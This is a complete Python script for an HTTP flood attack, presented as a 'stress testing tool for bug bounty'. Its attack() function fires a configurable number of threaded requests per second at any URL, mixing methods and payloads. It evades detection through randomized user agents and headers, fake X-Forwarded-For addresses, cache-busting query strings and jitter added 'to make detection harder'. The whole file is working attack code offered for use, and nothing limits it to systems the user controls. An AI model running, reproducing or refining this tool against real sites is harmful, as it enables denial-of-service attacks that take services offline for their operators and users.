import requests
import threading
import time
import argparse
import random
import socket
import ssl
import http.client
import urllib3
from fake_useragent import UserAgent
from colorama import Fore, Style, init
import dns.resolver
import os
import sys

# Initialize colorama
init(autoreset=True)

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Enhanced User-Agent list with more diversity
ua = UserAgent()

# Global counters
success_count = 0
error_count = 0
timeout_count = 0
redirect_count = 0
lock = threading.Lock()

# DNS cache
dns_cache = {}

def get_random_headers():
    """Generate random headers for each request"""
    headers = {
        "User-Agent": ua.random,
        "Accept": random.choice(["text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", 
                                "*/*", 
                                "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"]),
        "Accept-Language": random.choice(["en-US,en;q=0.5", "en-GB,en;q=0.5", "es-ES,es;q=0.5"]),
        "Accept-Encoding": random.choice(["gzip, deflate, br", "gzip, deflate"]),
        "Connection": random.choice(["keep-alive", "close"]),
        "Cache-Control": random.choice(["max-age=0", "no-cache", "no-store"]),
        "Pragma": random.choice(["no-cache", ""]),
        "Referer": random.choice(["https://www.google.com/", "https://www.bing.com/", ""]),
        "DNT": random.choice(["1", ""]),
        "Upgrade-Insecure-Requests": random.choice(["1", ""]),
        "TE": random.choice(["Trailers", ""])
    }
    
    # Randomly add some additional headers
    if random.random() > 0.7:
        headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    if random.random() > 0.8:
        headers["X-Requested-With"] = random.choice(["XMLHttpRequest", "com.example.app"])
    if random.random() > 0.9:
        headers["X-Custom-Header"] = "".join(random.choices("abcdefghijklmnopqrstuvwxyz1234567890", k=10))
    
    return headers

def resolve_dns(domain):
    """DNS resolution with caching"""
    if domain in dns_cache:
        return dns_cache[domain]
    
    try:
        answers = dns.resolver.resolve(domain, 'A')
        ips = [str(r) for r in answers]
        dns_cache[domain] = ips
        return ips
    except:
        return None

def send_request(url, method="GET", payload=None):
    """Send HTTP request with enhanced capabilities"""
    global success_count, error_count, timeout_count, redirect_count
    
    parsed_url = urllib3.util.parse_url(url)
    domain = parsed_url.host
    path = parsed_url.path or "/"
    
    headers = get_random_headers()
    
    try:
        # Randomly select between requests and low-level sockets
        if random.random() > 0.3:  # 70% chance to use requests
            if method == "GET":
                res = requests.request(
                    method,
                    url,
                    headers=headers,
                    timeout=5,
                    verify=False,
                    allow_redirects=False
                )
            else:
                res = requests.request(
                    method,
                    url,
                    headers=headers,
                    data=payload,
                    timeout=5,
                    verify=False,
                    allow_redirects=False
                )
            
            with lock:
                success_count += 1
                if res.status_code in [301, 302, 303, 307, 308]:
                    redirect_count += 1
                
            return res
        
        else:  # 30% chance to use low-level sockets
            ips = resolve_dns(domain)
            if not ips:
                with lock:
                    error_count += 1
                return None
            
            ip = random.choice(ips)
            port = parsed_url.port or (443 if parsed_url.scheme == "https" else 80)
            
            if parsed_url.scheme == "https":
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                
                conn = http.client.HTTPSConnection(ip, port, timeout=5, context=context)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=5)
            
            # Add Host header for virtual hosting
            headers["Host"] = domain
            
            # Random path variations
            if random.random() > 0.8:
                path = path + "?" + "&".join([f"{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=5))}={random.randint(1,100)}" 
                                            for _ in range(random.randint(1,5))])
            
            conn.request(method, path, headers=headers, body=payload)
            res = conn.getresponse()
            
            with lock:
                success_count += 1
                if res.status in [301, 302, 303, 307, 308]:
                    redirect_count += 1
            
            return res
            
    except requests.exceptions.Timeout:
        with lock:
            timeout_count += 1
    except requests.exceptions.TooManyRedirects:
        with lock:
            redirect_count += 1
    except Exception as e:
        with lock:
            error_count += 1
    return None

def attack(url, duration, rps, methods, payloads):
    """Main attack function with multiple methods and payloads"""
    end_time = time.time() + duration
    methods = methods.split(',')
    
    while time.time() < end_time:
        threads = []
        for _ in range(rps):
            method = random.choice(methods)
            payload = random.choice(payloads) if payloads and method in ["POST", "PUT"] else None
            t = threading.Thread(target=send_request, args=(url, method, payload))
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Add some jitter to make detection harder
        time.sleep(random.uniform(0.8, 1.2))
        
        # Wait for threads to complete
        for t in threads:
            t.join(timeout=5)

def print_stats():
    """Display statistics during the attack"""
    while True:
        time.sleep(5)
        with lock:
            print(f"\n{Fore.CYAN}[STATS]{Style.RESET_ALL} Success: {Fore.GREEN}{success_count}{Style.RESET_ALL} | "
                  f"Errors: {Fore.RED}{error_count}{Style.RESET_ALL} | "
                  f"Timeouts: {Fore.YELLOW}{timeout_count}{Style.RESET_ALL} | "
                  f"Redirects: {Fore.MAGENTA}{redirect_count}{Style.RESET_ALL}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Advanced Web Stress Testing Tool for Bug Bounty")
    parser.add_argument("--url", required=True, help="Target URL (e.g., https://example.com)")
    parser.add_argument("--duration", type=int, default=60, help="Duration in seconds")
    parser.add_argument("--rps", type=int, default=100, help="Requests per second")
    parser.add_argument("--methods", default="GET,POST,PUT,HEAD,OPTIONS", 
                       help="HTTP methods to use (comma separated)")
    parser.add_argument("--payloads", default="payloads.txt", 
                       help="File containing payloads for POST/PUT requests")
    
    args = parser.parse_args()
    
    # Load payloads if file exists
    payloads = []
    if os.path.exists(args.payloads):
        with open(args.payloads, "r") as f:
            payloads = [line.strip() for line in f if line.strip()]
    
    print(f"{Fore.YELLOW}[!] Starting advanced stress test to {args.url}{Style.RESET_ALL}")
    print(f"{Fore.BLUE}[i] Duration: {args.duration} sec | RPS: {args.rps} | Methods: {args.methods}{Style.RESET_ALL}")
    print(f"{Fore.BLUE}[i] Loaded {len(payloads)} payloads for POST/PUT requests{Style.RESET_ALL}")
    
    # Start stats thread
    stats_thread = threading.Thread(target=print_stats)
    stats_thread.daemon = True
    stats_thread.start()
    
    # Start attack
    try:
        attack(args.url, args.duration, args.rps, args.methods, payloads)
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Attack interrupted by user{Style.RESET_ALL}")
    
    print(f"\n{Fore.GREEN}[✓] Stress test completed.{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[+] Total requests:{Style.RESET_ALL}")
    print(f"  Success: {Fore.GREEN}{success_count}{Style.RESET_ALL}")
    print(f"  Errors: {Fore.RED}{error_count}{Style.RESET_ALL}")
    print(f"  Timeouts: {Fore.YELLOW}{timeout_count}{Style.RESET_ALL}")
    print(f"  Redirects: {Fore.MAGENTA}{redirect_count}{Style.RESET_ALL}")